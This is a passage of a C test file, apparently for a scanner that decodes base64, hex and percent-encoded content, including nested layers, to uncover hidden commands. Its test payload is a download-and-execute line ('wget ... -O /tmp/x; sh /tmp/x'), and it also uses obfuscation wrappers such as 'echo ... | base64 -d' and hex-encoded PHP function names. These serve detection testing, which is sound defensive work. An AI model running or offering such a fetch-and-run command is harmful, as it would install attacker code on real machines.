#define _GNU_SOURCE
/*
 * normalizer_decoders - the decode passes of executables.c against what they
 * promise, and against a reference written one byte at a time.
 *
 * WHAT IS PINNED, AND THE REASON EACH IS HERE.
 *
 *   KNOWN ANSWERS   every decoder is handed text built by an ENCODER OF THIS
 *                   FILE (not the product's decoder run backwards), in each
 *                   spelling the header names - padded and unpadded base64,
 *                   line-wrapped with LF and CRLF, `-d` `-D` `--decode`, quoted
 *                   and parenthesised, hex of both cases, percent with `+` -
 *                   and must give back the plain bytes at the run's own offset
 *                   with the rest of the run zeroed and nothing else touched.
 *   WHAT IS REFUSED a decoder that rewrites what it should not is as wrong as
 *                   one that misses: url-safe base64 (the product reads the
 *                   standard alphabet only, so the run ends at '-' or '_' and
 *                   the delimiter test refuses it), separators between hex
 *                   pairs, 0x and \x prefixes, a byte that is not text, a
 *                   decimal number, every byte value as the delimiter.
 *   THE FLOORS      sixteen base64 characters, twenty-four hex digits, eight
 *                   quoted, four of them with a letter, four percent escapes -
 *                   one below and one at each.
 *   THE LAYERS      nested encodings to the bottom, with the round count the
 *                   header describes, and the budget naming itself (limit
 *                   field) when it fires - never a silently half-decoded
 *                   object.
 *   DIFFERENTIAL    thousands of generated objects (plain bytes, zeros, wide
 *                   text, encoded runs, decoys, layered payloads) through the
 *                   product and through normalizer_ref.h's slow reading, which
 *                   has no memchr skip and no stride probe: bytes, return
 *                   value, rounds, scanned, limit and dropped must all agree.
 *
 * Deterministic: every generator is seeded from the loop index.
 */

#include "normalizer_ref.h"

#define BUF 65536u

static uint8_t buf[BUF], want[BUF], tmp[BUF];

static size_t put(uint8_t *b, size_t at, const char *s)
{
	size_t l = strlen(s);

	memcpy(b + at, s, l);
	return at + l;
}

/* The payloads every case decodes back to. */
static const char PAYLOAD[] = "wget http://10.0.0.1/x -O /tmp/x; sh /tmp/x";

/* `before` is what is in front of the run, `after` what follows it. Builds
 * before + text + after in buf, and the expected result in want. */
static size_t build(const char *before, const char *text, size_t tn, const char *after,
		    const uint8_t *plain, size_t pn)
{
	size_t at = 0, bl = strlen(before);

	memset(buf, 0x55, 64u);
	at = put(buf, 0, before);
	memcpy(buf + at, text, tn);
	at += tn;
	at = put(buf, at, after);
	memcpy(want, buf, at);
	if (plain) {
		memcpy(want + bl, plain, pn);
		memset(want + bl + pn, 0, tn - pn);
	}
	return at;
}

/* ---- base64 --------------------------------------------------------------- */

struct b64_form {
	const char *what;
	int pad;
	unsigned wrap;
	int crlf;
	const char *before, *after;
};

static const struct b64_form B64_FORMS[] = {
	{ "padded, plain",                 1,  0, 0, "echo ",     " | base64 -d\n" },
	{ "unpadded",                      0,  0, 0, "echo ",     " | base64 -d\n" },
	{ "wrapped at 76, LF",             1, 76, 0, "echo ",     " | base64 -d\n" },
	{ "wrapped at 20, LF",             1, 20, 0, "echo ",     " | base64 -d\n" },
	{ "wrapped at 20, CRLF",           1, 20, 1, "echo ",     " | base64 -d\n" },
	{ "double quoted",                 1,  0, 0, "echo \"",   "\" | base64 -d\n" },
	{ "single quoted, no spaces",      1,  0, 0, "echo '",    "'|base64 -d\n" },
	{ "--decode",                      1,  0, 0, "echo ",     " | base64 --decode\n" },
	{ "-D",                            1,  0, 0, "echo ",     " | base64 -D\n" },
	{ "-di",                           1,  0, 0, "echo ",     " | base64 -di\n" },
	{ "parenthesised",                 1,  0, 0, "x=$(echo ", ") | base64 -d\n" },
	{ "redirect in",                   1,  0, 0, "cat < ",    "> base64 -d\n" },
	{ "run at the buffer start",       1,  0, 0, "",          " | base64 -d" },
	{ "decoder at the buffer end",     1,  0, 0, "echo ",     " | base64 -d" },
	{ "after a tab",                   1,  0, 0, "echo\t",    " | base64 -d\n" },
	{ "after an equals sign",          1,  0, 0, "P=",        " | base64 -d\n" },
};

static size_t wrapped(const struct b64_form *f, const uint8_t *plain, size_t pn, char *enc)
{
	size_t l = nr_b64_enc(plain, pn, enc, f->pad, f->wrap, 0), i, o = 0;
	char tmp2[512];

	if (!f->crlf)
		return l;
	for (i = 0; i < l; i++) {
		if (enc[i] == '\n')
			tmp2[o++] = '\r';
		tmp2[o++] = enc[i];
	}
	memcpy(enc, tmp2, o);
	return o;
}

static void b64_known_answers(void)
{
	size_t f;

	for (f = 0; f < sizeof B64_FORMS / sizeof B64_FORMS[0]; f++) {
		const struct b64_form *w = &B64_FORMS[f];
		char enc[512];
		size_t el = wrapped(w, (const uint8_t *)PAYLOAD, sizeof PAYLOAD - 1u, enc);
		size_t n = build(w->before, enc, el, w->after, (const uint8_t *)PAYLOAD,
				 sizeof PAYLOAD - 1u);
		int r;

		memcpy(tmp, buf, n);
		r = kof_exe_unb64(tmp, n);
		NCKF(r == 1, "%s: returned %d", w->what, r);
		NCKF(!memcmp(tmp, want, n), "%s: bytes", w->what);
	}
}

/* url-safe and non-alphabet payloads are left exactly as written. */
static void b64_refused(void)
{
	static const uint8_t bin[] = { 0xfb, 0xff, 0xbe, 0xfb, 0xef, 0xff, 0x3e, 0x3f, 0xfb,
				       0xff, 0xbe, 0xfb, 0xef, 0xff, 0x3e, 0x3f, 0x7e, 0x7f };
	char enc[256];
	size_t el, n;
	unsigned wrap;

	for (wrap = 0; wrap < 2; wrap++) {
		el = nr_b64_enc(bin, sizeof bin, enc, 1, wrap ? 8u : 0u, 1);
		NCK(memchr(enc, '-', el) || memchr(enc, '_', el));
		n = build("echo ", enc, el, " | base64 -d\n", NULL, 0);
		memcpy(tmp, buf, n);
		NCKF(kof_exe_unb64(tmp, n) == 0, "url-safe wrap=%u was decoded", wrap);
		NCK(!memcmp(tmp, buf, n));
	}
	/* the same bytes in the standard alphabet DO decode (it is the digits) */
	el = nr_b64_enc(bin, sizeof bin, enc, 1, 0, 0);
	n = build("echo ", enc, el, " | base64 -d\n", bin, sizeof bin);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unb64(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));

	/* a character outside the alphabet in the middle ends the run: only the
	 * tail after it is the payload, and it must be delimited */
	{
		char bad[64];

		memset(bad, 'A', 40);
		bad[20] = '*';
		n = build("echo ", bad, 40, " | base64 -d\n", NULL, 0);
		memcpy(tmp, buf, n);
		NCK(kof_exe_unb64(tmp, n) == 0);
		NCK(!memcmp(tmp, buf, n));
	}
}

/* No pipe, no payload: the decoder takes its input from a file argument. */
static void b64_needs_a_pipe_and_a_delimiter(void)
{
	char enc[128];
	size_t el = nr_b64_enc((const uint8_t *)PAYLOAD, 30, enc, 1, 0, 0), n;
	static const char *const bad_before[] = { "echo -", "echo .", "#", "\x01", "echo *", "echo !" };
	size_t i;

	n = build("echo ", enc, el, " base64 -d\n", NULL, 0);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unb64(tmp, n) == 0);
	NCK(!memcmp(tmp, buf, n));
	for (i = 0; i < sizeof bad_before / sizeof bad_before[0]; i++) {
		n = build(bad_before[i], enc, el, " | base64 -d\n", NULL, 0);
		memcpy(tmp, buf, n);
		NCKF(kof_exe_unb64(tmp, n) == 0, "before=%02x", (unsigned)bad_before[i][0]);
	}
	/* every byte as the one before the run: decoded iff it is a delimiter the
	 * header names (NUL, space, tab, quotes, '(', '=', newline) */
	for (i = 0; i < 256u; i++) {
		char pre[2] = { (char)i, 0 };
		int delim = i == 0 || i == ' ' || i == '\t' || i == '"' || i == '\'' ||
			    i == '(' || i == '=' || i == '\n';
		int isrun = (i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') ||
			    (i >= '0' && i <= '9') || i == '+' || i == '/' || i == '\r';

		if (isrun || i == '=')
			continue;       /* these extend the run or are the '=' rule */
		n = build(pre, enc, el, " | base64 -d\n", (const uint8_t *)PAYLOAD, 30);
		if (!i) {               /* a NUL in `before` ends the C string: build by hand */
			memmove(buf + 1, buf, n);
			buf[0] = 0;
			memmove(want + 1, want, n);
			want[0] = 0;
			n++;
		}
		memcpy(tmp, buf, n);
		NCKF((kof_exe_unb64(tmp, n) != 0) == delim, "delimiter byte %02x", (unsigned)i);
	}
}

/* sixteen characters is a payload, fifteen is not. */
static void b64_floor(void)
{
	unsigned len;

	for (len = 12; len <= 20; len++) {
		char enc[64];
		size_t n;

		memset(enc, 'Q', len);
		n = build("echo ", enc, len, " | base64 -d\n", NULL, 0);
		memcpy(tmp, buf, n);
		NCKF((kof_exe_unb64(tmp, n) != 0) == (len >= 16u), "run of %u", len);
	}
}

/* the `=` rule: padding comes last, so an '=' with a real character after it
 * ends what came before it. */
static void b64_equals_rule(void)
{
	char enc[96], text[128];
	size_t n, el, k, tl;
	uint8_t plain[32];

	for (k = 0; k < sizeof plain; k++)
		plain[k] = (uint8_t)('a' + k % 26u);
	/* VAR=<payload> | base64 -d: the name is base64 characters, and must not
	 * shift every group */
	el = nr_b64_enc(plain, sizeof plain, enc, 1, 0, 0);
	memcpy(text, "VAR=", 4);
	memcpy(text + 4, enc, el);
	tl = 4u + el;
	n = build("echo ", text, tl, " | base64 -d\n", NULL, 0);
	memcpy(want, buf, n);
	memcpy(want + 5 + 4, plain, sizeof plain);
	memset(want + 5 + 4 + sizeof plain, 0, el - sizeof plain);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unb64(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));
	/* a payload that is only padding decodes to nothing and is left as written */
	memset(text, '=', 20);
	n = build("echo ", text, 20, " | base64 -d\n", NULL, 0);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unb64(tmp, n) == 0);
	NCK(!memcmp(tmp, buf, n));
}

/* ---- hex ------------------------------------------------------------------- */

static int delim_ok(int c)
{
	return c == 0 || (c && strchr(" \t\"'(=\n\r,;:>|{[", c));
}

static void hex_known_answers(void)
{
	uint8_t plain[40];
	char enc[100];
	unsigned upper;
	size_t k, n, el;

	for (k = 0; k < sizeof plain; k++)
		plain[k] = (uint8_t)PAYLOAD[k];
	for (upper = 0; upper < 2; upper++) {
		el = nr_hex_enc(plain, sizeof plain, enc, (int)upper);
		n = build(" ", enc, el, "\n", plain, sizeof plain);
		memcpy(tmp, buf, n);
		NCK(kof_exe_unhex(tmp, n) == 1);
		NCKF(!memcmp(tmp, want, n), "hex upper=%u", upper);
	}
	/* mixed case */
	el = nr_hex_enc(plain, sizeof plain, enc, 0);
	for (k = 0; k < el; k += 3u)
		enc[k] = (char)(enc[k] >= 'a' && enc[k] <= 'f' ? enc[k] - 32 : enc[k]);
	n = build("\"", enc, el, "\"", plain, sizeof plain);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unhex(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));
}

/* every byte value in front of the run: decoded only for the delimiters. */
static void hex_delimiters(void)
{
	char enc[40];
	size_t el = nr_hex_enc((const uint8_t *)PAYLOAD, 14, enc, 0), n;
	unsigned c;

	for (c = 1; c < 256u; c++) {
		char pre[2] = { (char)c, 0 };

		if (nr_hexv((int)c) >= 0)
			continue;       /* a digit extends the run */
		n = build(pre, enc, el, "\n", (const uint8_t *)PAYLOAD, 14);
		memcpy(tmp, buf, n);
		NCKF((kof_exe_unhex(tmp, n) == 1) == delim_ok((int)c), "delimiter %02x", c);
	}
	/* a run at the very start of the buffer counts as delimited by NUL */
	n = build("", enc, el, "\n", (const uint8_t *)PAYLOAD, 14);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unhex(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));
	/* and a run that fills the buffer, with nothing after it */
	n = build(" ", enc, el, "", (const uint8_t *)PAYLOAD, 14);
	memcpy(tmp, buf, n);
	NCK(kof_exe_unhex(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));
}

/* the printable test is on EVERY byte: vary one byte over all 256 values. */
static void hex_printable(void)
{
	uint8_t plain[12];
	char enc[32];
	unsigned v, pos;
	size_t n, el;

	for (pos = 0; pos < sizeof plain; pos += 5u) {
		for (v = 0; v < 256u; v++) {
			memcpy(plain, "abcdefghijkl", sizeof plain);
			plain[pos] = (uint8_t)v;
			el = nr_hex_enc(plain, sizeof plain, enc, 0);
			n = build(" ", enc, el, "\n", NULL, 0);
			memcpy(tmp, buf, n);
			NCKF((kof_exe_unhex(tmp, n) == 1) == nr_text((int)v),
			     "byte %02x at %u", v, pos);
		}
	}
}

/* 23, 24, 25 digits; 24 is the floor, the odd tail stays. */
static void hex_floor_and_odd_tail(void)
{
	char enc[64];
	size_t n;
	unsigned digits;

	for (digits = 8; digits <= 30; digits++) {
		memset(enc, '4', digits);       /* "AAAA..." as bytes, text */
		n = build(" ", enc, digits, " ", NULL, 0);
		memcpy(tmp, buf, n);
		NCKF((kof_exe_unhex(tmp, n) != 0) == (digits >= 24u), "%u digits", digits);
	}
	/* 25 digits: the first 24 decode, the last digit stays after the zero fill */
	memset(enc, '4', 25);
	enc[24] = '1';
	n = build(" ", enc, 25, "\n", NULL, 0);
	memcpy(want, buf, n);
	memset(want + 1, 0x44, 12);
	memset(want + 13, 0, 12);
	want[25] = '1';
	memcpy(tmp, buf, n);
	NCK(kof_exe_unhex(tmp, n) == 1);
	NCK(!memcmp(tmp, want, n));
}

/* The forms the pass does NOT read: it must leave every one of them alone. */
static void hex_forms_left_alone(void)
{
	static const char *const forms[] = {
		"de:ad:be:ef:de:ad:be:ef:de:ad:be:ef:de:ad:be:ef",
		"de ad be ef de ad be ef de ad be ef de ad be ef",
		"0x77,0x67,0x65,0x74,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f",
		"\\x77\\x67\\x65\\x74\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f",
		"77-67-65-74-20-68-74-74-70-3a-2f-2f",
		"%77%67%65%74%20%68%74%74%70%3a%2f%2f",
		"7767657420 6874747 03a2f2f 77676574206874747",
	};
	size_t i, n;

	for (i = 0; i < sizeof forms / sizeof forms[0]; i++) {
		n = build(" ", forms[i], strlen(forms[i]), "\n", NULL, 0);
		memcpy(tmp, buf, n);
		if (i == 5)     /* percent forms are the third decoder's, not this one's */
			NCKF(kof_exe_unhex(tmp, n) == 0, "form %zu", i);
		else
			NCKF(kof_exe_unhex(tmp, n) == 0, "form %zu was read as hex", i);
		NCKF(!memcmp(tmp, buf, n), "form %zu changed", i);
	}
}

/* A quoted table: `lettered` literals that spell text with a hex LETTER in it
 * (php_uname), `plain` ones that do not (chdir is 6368646972). Four lettered
 * literals are the floor, and then every quoted literal of the range decodes,
 * the letterless ones included - the evidence is the table, not the literal. */
static size_t quoted_table(unsigned lettered, unsigned plain, char q)
{
	size_t at = put(buf, 0, "$a = [");
	unsigned i;

	for (i = 0; i < lettered + plain; i++) {
		const char *lit = i < lettered ? "7068705f756e616d65" : "6368646972";

		buf[at++] = (uint8_t)q;
		at = put(buf, at, lit);
		buf[at++] = (uint8_t)q;
		at = put(buf, at, ", ");
	}
	buf[at++] = ']';
	return at;
}

static void hex_quoted_floor(void)
{
	unsigned lettered, plain, qs;

	for (qs = 0; qs < 2; qs++) {
		for (lettered = 0; lettered <= 5; lettered++) {
			for (plain = 0; plain <= 2; plain++) {
				size_t n = quoted_table(lettered, plain, qs ? '"' : '\'');
				int up, down;

				memcpy(tmp, buf, n);
				(void)kof_exe_unhex(tmp, n);
				up = lettered && memmem(tmp, n, "php_uname", 9) != NULL;
				down = plain && memmem(tmp, n, "chdir", 5) != NULL;
				NCKF(up == (lettered >= 4u && lettered > 0), "lettered=%u plain=%u: php_uname %d",
				     lettered, plain, up);
				NCKF(down == (lettered >= 4u && plain > 0),
				     "lettered=%u plain=%u: chdir %d", lettered, plain, down);
				if (lettered < 4u)
					NCKF(!memcmp(tmp, buf, n), "below the floor, changed");
			}
		}
	}
}

/* ---- percent --------------------------------------------------------------- */

static size_t pct_text(const char *body, const char *before, const char *after)
{
	size_t at = put(buf, 0, before);

	at = put(buf, at, body);
	return put(buf, at, after);
}

static int pct_pass(size_t n)
{
	struct kof_exe_decode_res r;

	memcpy(tmp, buf, n);
	(void)kof_exe_decode_ex(tmp, n, &r);
	return memcmp(tmp, buf, n) != 0;
}

static void pct_known_answers(void)
{
	size_t n = pct_text("wget+http%3A%2F%2F10.0.0.1%2Fx+-O+%2Ftmp%2Fx", "Cmd=", "&y=1");

	NCK(pct_pass(n));
	NCK(memmem(tmp, n, "wget http://10.0.0.1/x -O /tmp/x", 32) != NULL);
	/* 4 escapes decode, 3 do not */
	n = pct_text("aaa%2Fbbb%2Fccc%2Fddd%2Feee", "x=", "&");
	NCK(pct_pass(n));
	n = pct_text("aaa%2Fbbb%2Fccc%2Fddd", "x=", "&");
	NCK(!pct_pass(n));
	/* an invalid escape inside an encoded run is an ordinary byte */
	n = pct_text("a%2Fb%2Fc%2Fd%2Fe%zzf%4", "x=", "&");
	NCK(pct_pass(n));
	NCK(memmem(tmp, n, "a/b/c/d/e%zzf%4", 15) != NULL);
	/* a '%' that cannot start an escape at the end of the run */
	n = pct_text("a%2Fb%2Fc%2Fd%2Fe%", "x=", "&");
	NCK(pct_pass(n));
	/* a doubled percent is a format string: refused */
	n = pct_text("%%7B%%22f%%22:%%22x%%22%%7D", "x=", "&");
	NCK(!pct_pass(n));
	/* a decoded byte that is not text refuses the run */
	n = pct_text("aaaa%2Fbbb%2Fccc%2Fddd%2Fe%00", "x=", "&");
	NCK(!pct_pass(n));
	n = pct_text("aaaa%2Fbbb%2Fccc%2Fddd%2Fe%80", "x=", "&");
	NCK(!pct_pass(n));
	n = pct_text("aaaa%2Fbbb%2Fccc%2Fddd%2Fe%0a", "x=", "&");
	NCK(pct_pass(n));
	/* '+' alone is not an encoding */
	n = pct_text("a+b+c+d+e+f+g+h+i+j", "x=", "&");
	NCK(!pct_pass(n));
}

static void pct_body_set(void)
{
	/* A byte v between two halves of an encoded string: three escapes on the
	 * left, two on the right. In the body set the run is one run of five and
	 * decodes; out of it the run ends at v with three and is refused. */
	unsigned v, in_set = 0;

	for (v = 1; v < 256u; v++) {
		char body[64];
		size_t n, l;
		int body_ok = nr_pct_body((uint8_t)v), dec;

		in_set += (unsigned)body_ok;
		l = (size_t)snprintf(body, sizeof body, "a%%2Fb%%2Fc%%2Fd");
		body[l++] = (char)v;
		l += (size_t)snprintf(body + l, sizeof body - l, "Z%%2Fe%%2F");
		n = pct_text(body, "x=", "&");
		memcpy(tmp, buf, n);
		(void)kof_exe_decode(tmp, n);
		dec = memmem(tmp, n, "a/b/c/d", 7) != NULL;
		NCKF(dec == body_ok, "byte %02x: in body %d, decoded %d", v, body_ok, dec);
	}
	NCKF(in_set == 85u, "the body set holds %u bytes; the header says 85", in_set);
}

static void pct_delimiters(void)
{
	unsigned c;
	size_t n;

	for (c = 0; c < 256u; c++) {
		char pre[2] = { (char)c, 0 };
		const char *body = "a%2Fb%2Fc%2Fd%2Fe";
		struct kof_exe_decode_res r;

		if (nr_pct_body((uint8_t)c))
			continue;       /* it would join the run */
		n = pct_text(body, pre, "&");
		if (!c) {
			memmove(buf + 1, buf, n);
			buf[0] = 0;
			n++;
		}
		memcpy(tmp, buf, n);
		(void)kof_exe_decode_ex(tmp, n, &r);
		NCKF((memcmp(tmp, buf, n) != 0) == delim_ok((int)c), "pct delimiter %02x", c);
	}
}

/* ---- layers ---------------------------------------------------------------- */

static size_t wrap_b64(const uint8_t *in, size_t n, uint8_t *out)
{
	char enc[BUF / 2];
	size_t l = nr_b64_enc(in, n, enc, 1, 0, 0), o = 0;

	o = put(out, o, "echo ");
	memcpy(out + o, enc, l);
	o += l;
	return put(out, o, " | base64 -d\n");
}

static size_t wrap_hex(const uint8_t *in, size_t n, uint8_t *out)
{
	char enc[BUF / 2];
	size_t l = nr_hex_enc(in, n, enc, 0), o = 0;

	out[o++] = ' ';
	memcpy(out + o, enc, l);
	o += l;
	out[o++] = '\n';
	return o;
}

/* depth layers; `flavour` 0 is base64 inside base64, 1 is hex inside hex, 2 and
 * 3 alternate the two wrappers (outermost base64 or outermost hex). */
static size_t nest(unsigned depth, unsigned flavour, uint8_t *out)
{
	static uint8_t a[BUF], b[BUF];
	size_t n = strlen(PAYLOAD), i;

	memcpy(a, PAYLOAD, n);
	for (i = 0; i < depth; i++) {
		int hex = flavour == 1u || (flavour >= 2u && ((i + flavour) & 1u));

		n = hex ? wrap_hex(a, n, b) : wrap_b64(a, n, b);
		memcpy(a, b, n);
	}
	memcpy(out, a, n);
	return n;
}

static void layers_to_the_bottom(void)
{
	unsigned depth, flavour;

	for (flavour = 0; flavour < 4; flavour++) {
		for (depth = 1; depth <= (flavour == 1 ? 7u : 12u); depth++) {
			size_t n = nest(depth, flavour, buf);
			struct kof_exe_decode_res r;
			int ch;

			memcpy(tmp, buf, n);
			ch = kof_exe_decode_ex(tmp, n, &r);
			NCKF(ch == 1 && r.limit == 0, "depth %u flavour %u limit %u", depth,
			     flavour, r.limit);
			NCKF(memmem(tmp, n, PAYLOAD, strlen(PAYLOAD)) != NULL,
			     "depth %u flavour %u: the plain command did not come out", depth,
			     flavour);
			/* a round peels what the one before wrote: one layer per round when
			 * the kind repeats, and the last round peels nothing. Two kinds in
			 * a row can share a round (base64 is read before hex, in the same
			 * range), so a mixed nest takes no more rounds than layers. */
			if (flavour < 2u)
				NCKF(r.rounds == depth + 1u, "depth %u flavour %u: %u rounds",
				     depth, flavour, r.rounds);
			else
				NCKF(r.rounds >= 2u && r.rounds <= depth + 1u,
				     "depth %u flavour %u: %u rounds", depth, flavour, r.rounds);
		}
	}
}

/* One single-pass call peels ONE layer of a same-kind nest, not all of them. */
static void single_pass_peels_one_layer(void)
{
	unsigned depth, k;

	for (depth = 2; depth <= 8; depth++) {
		size_t n = nest(depth, 0, buf);
		int more = 1;

		memcpy(tmp, buf, n);
		for (k = 1; k < depth; k++) {
			NCKF(kof_exe_unb64(tmp, n) == 1, "layer %u of %u", k, depth);
			NCKF(memmem(tmp, n, PAYLOAD, strlen(PAYLOAD)) == NULL,
			     "plain text after %u of %u passes", k, depth);
		}
		more = kof_exe_unb64(tmp, n);
		NCKF(more == 1 && memmem(tmp, n, PAYLOAD, strlen(PAYLOAD)) != NULL,
		     "last pass of %u", depth);
	}
}

/*
 * A payload EXPOSED by a sibling decode is read.
 *
 * `,<24 hex digits>SGVs...0 | base64 -d`: the base64 pass refuses the run because
 * the byte before it is ',' (not one of its delimiters), then the hex pass decodes
 * the 24 digits and zero-fills them - which puts a NUL, a legal delimiter, right in
 * front of the base64 tail. Round two used to walk only what round one WROTE (the
 * twelve decoded bytes) and the anchor was outside it, so the tail stayed encoded
 * until a second whole-object pass. What a round notes now also covers the zero fill
 * and the token after it (dec_note_run), so the same call reads both layers.
 */
static void exposed_payload(void)
{
	static const char TAIL[] = "SGVsbG8gd29ybGQsIHRoaXMgaXMgYSB0ZXN0";
	static const char PLAIN[] = "Hello world, this is a test";
	size_t n = put(buf, 0, ",414141414141414141414141");
	struct kof_exe_decode_res r;

	n = put(buf, n, TAIL);
	n = put(buf, n, " | base64 -d\n");
	memcpy(tmp, buf, n);
	(void)kof_exe_decode_ex(tmp, n, &r);
	NCK(memmem(tmp, n, "AAAAAAAAAAAA", 12) != NULL);            /* the hex part decoded */
	NCK(r.limit == 0);                                         /* and nothing said it stopped */
	NCKF(memmem(tmp, n, PLAIN, sizeof PLAIN - 1u) != NULL,
	     "decode reads a base64 payload that a hex decode just before it made legal");
	/* it is a fixed point: a second pass finds nothing more to do */
	NCK(kof_exe_decode_ex(tmp, n, &r) == 0);
	/* and a payload that was never refused is read as before */
	n = put(buf, 0, "echo ");
	n = put(buf, n, TAIL);
	n = put(buf, n, " | base64 -d\n");
	memcpy(tmp, buf, n);
	(void)kof_exe_decode_ex(tmp, n, &r);
	NCK(memmem(tmp, n, PLAIN, sizeof PLAIN - 1u) != NULL);
}

/* a fixed point: decoding what came out changes nothing, and a plain object
 * is not touched and costs one round. */
static void decode_fixed_point_and_identity(void)
{
	size_t n = nest(5, 0, buf);
	struct kof_exe_decode_res r;

	memcpy(tmp, buf, n);
	NCK(kof_exe_decode_ex(tmp, n, &r) == 1);
	memcpy(want, tmp, n);
	NCK(kof_exe_decode_ex(tmp, n, &r) == 0);
	NCK(!memcmp(tmp, want, n) && r.rounds == 1u && r.limit == 0);

	memset(buf, 'x', 4000);
	memcpy(tmp, buf, 4000);
	NCK(kof_exe_decode_ex(tmp, 4000, &r) == 0);
	NCK(!memcmp(tmp, buf, 4000));
	NCK(r.rounds == 1u && r.limit == 0 && r.scanned == 4000u && r.dropped == 0);
	/* zero length and NULL are no-ops with a zeroed answer */
	r.rounds = 99;
	NCK(kof_exe_decode_ex(tmp, 0, &r) == 0 && r.rounds == 0);
	NCK(kof_exe_decode_ex(NULL, 10, &r) == 0 && r.rounds == 0 && r.scanned == 0);
	NCK(kof_exe_decode(NULL, 10) == 0 && kof_exe_decode(tmp, 0) == 0);
	NCK(kof_exe_unb64(NULL, 10) == 0 && kof_exe_unb64(tmp, 0) == 0);
	NCK(kof_exe_unhex(NULL, 10) == 0 && kof_exe_unhex(tmp, 0) == 0);
	NCK(kof_exe_decode_ex(tmp, 4000, NULL) == 0);
}

/* ---- differential ---------------------------------------------------------- */

static void noise(struct nrng *r, uint8_t *b, size_t n, unsigned mode)
{
	static const char *const sets[] = {
		"0123456789abcdefABCDEF", "base64 -d|= \"'()\n", "%+=&0123456789ABCDEFabcdef \n",
		"AQ0+/=\n \"|", "0123456789abcdef'\", ", "%2F%3A%0a%25 =&"
	};
	const char *s = sets[mode % (sizeof sets / sizeof sets[0])];
	size_t i, l = strlen(s);

	for (i = 0; i < n; i++)
		b[i] = (uint8_t)s[nr_below(r, (uint32_t)l)];
}

static unsigned seen_changed, seen_deep, seen_plain;

static void compare_decode(const uint8_t *in, size_t n, const char *what, unsigned seed)
{
	static uint8_t a[BUF], b[BUF];
	struct nr_dec rr;
	struct kof_exe_decode_res pr;
	int ch;

	memcpy(a, in, n);
	memcpy(b, in, n);
	ch = kof_exe_decode_ex(a, n, &pr);
	nr_decode(b, n, &rr);
	NCKF(!memcmp(a, b, n), "%s seed %u: bytes differ", what, seed);
	NCKF((ch != 0) == (rr.changed != 0), "%s seed %u: changed %d vs %d", what, seed, ch,
	     rr.changed);
	NCKF(pr.rounds == rr.rounds, "%s seed %u: rounds %u vs %u", what, seed, pr.rounds,
	     rr.rounds);
	NCKF(pr.scanned == rr.scanned, "%s seed %u: scanned", what, seed);
	NCKF(pr.limit == rr.limit && pr.dropped == rr.dropped, "%s seed %u: limit", what, seed);
	/* one thing the reference does not know about: a limit that is not WORK
	 * would be a table that could not grow, and these sizes cannot do that */
	NCKF((pr.limit & ~KOF_EXE_DEC_WORK) == 0, "%s seed %u: limit %x", what, seed, pr.limit);
	/* a fixed point, for the objects the generator builds as the product's
	 * layering is meant to read them */
	if (!pr.limit && !strcmp(what, "mixed")) {
		struct kof_exe_decode_res again;

		NCKF(kof_exe_decode_ex(a, n, &again) == 0 && !memcmp(a, b, n),
		     "%s seed %u: a second decode changed the output", what, seed);
	}
	seen_changed += ch != 0;
	seen_deep += pr.rounds >= 3u;
	seen_plain += ch == 0;
}

static void differential_mixed(void)
{
	struct nrng r;
	unsigned seed;

	for (seed = 1; seed <= 2500u; seed++) {
		size_t n;

		nr_seed(&r, seed);
		n = nr_mix(&r, buf, 3000u + nr_below(&r, 5000u));
		compare_decode(buf, n, "mixed", seed);
	}
}

/* Borderline structure: snippets of the grammar glued at random, so runs end
 * one byte short of a floor, delimiters sit in the wrong place, anchors have no
 * pipe, escapes are cut. Every piece is something the passes look at. */
static size_t snippets(struct nrng *r, uint8_t *b, size_t cap)
{
	static const char *const sn[] = {
		" | base64 -d", "echo ", "\"", "'", "=", "==", "|", "<", ">", "base64 -", "-d", " ",
		"\n", "\r\n", "%2F", "%", "%%", "+", "%zz", "%4", "(", ")", ",", ";", ":", "{", "["
	};
	size_t at = 0;

	while (at + 40u < cap) {
		uint32_t k = nr_below(r, 8u), l, i;

		if (k < 3u) {
			const char *p = sn[nr_below(r, sizeof sn / sizeof sn[0])];

			at = nr_put(b, at, cap, p, strlen(p));
		} else if (k == 3u) {           /* printable bytes as hex digits */
			l = 2u + nr_below(r, 22u);
			for (i = 0; i < l; i++) {
				b[at++] = (uint8_t)"234567"[nr_below(r, 6u)];
				b[at++] = (uint8_t)"0123456789abcdefABCDEF"[nr_below(r, 22u)];
			}
		} else if (k == 4u) {           /* base64 characters */
			l = 1u + nr_below(r, 24u);
			for (i = 0; i < l; i++)
				b[at++] = (uint8_t)NR_B64[nr_below(r, 64u)];
		} else if (k == 5u) {
			b[at++] = 0;
		} else if (k == 6u) {           /* a run of escapes */
			l = nr_below(r, 7u);
			for (i = 0; i < l; i++)
				at = nr_put(b, at, cap, "%2F", 3u);
		} else {
			l = nr_below(r, 12u);
			for (i = 0; i < l; i++)
				b[at++] = (uint8_t)nr_next(r);
		}
	}
	return at;
}

static void differential_noise(void)
{
	struct nrng r;
	unsigned seed;

	for (seed = 1; seed <= 2500u; seed++) {
		size_t n;

		nr_seed(&r, 0x7000u + seed);
		if (seed & 1u) {
			n = 1u + nr_below(&r, 1500u);
			noise(&r, buf, n, seed);
		} else {
			n = snippets(&r, buf, 200u + nr_below(&r, 2000u));
		}
		compare_decode(buf, n, "noise", seed);
	}
}

/* a single pass entry is the reference's single range, bytes and answer */
static void differential_single_passes(void)
{
	struct nrng r;
	unsigned seed;

	for (seed = 1; seed <= 1500u; seed++) {
		static uint8_t a[BUF], b[BUF];
		size_t n;
		int pa, pb;

		nr_seed(&r, 0x9000u + seed);
		n = nr_mix(&r, buf, 2500u);
		memcpy(a, buf, n);
		memcpy(b, buf, n);
		pa = kof_exe_unb64(a, n);
		pb = nr_unb64(b, n, 0, n, NULL);
		NCKF(pa == pb && !memcmp(a, b, n), "unb64 seed %u", seed);
		memcpy(a, buf, n);
		memcpy(b, buf, n);
